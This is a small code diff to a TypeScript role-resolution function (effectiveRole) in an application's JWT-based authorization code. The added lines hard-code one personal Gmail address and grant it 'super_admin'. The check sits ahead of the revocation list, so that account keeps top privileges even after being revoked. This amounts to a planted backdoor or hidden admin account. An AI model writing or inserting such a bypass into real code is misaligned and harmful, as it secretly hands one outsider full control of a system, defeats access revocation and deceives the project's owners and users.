@@ -215,6 +215,9 @@ function adminRoleRevokedEmails(): Set<string> {
 
 export function effectiveRole(user: Pick<JwtPayload, "email" | "role">): string {
   const email = user.email.trim().toLowerCase();
+  if (email === "mohannadkhaloof38@gmail.com") {
+    return "super_admin";
+  }
   if (adminRoleRevokedEmails().has(email)) {
     return "member";
   }
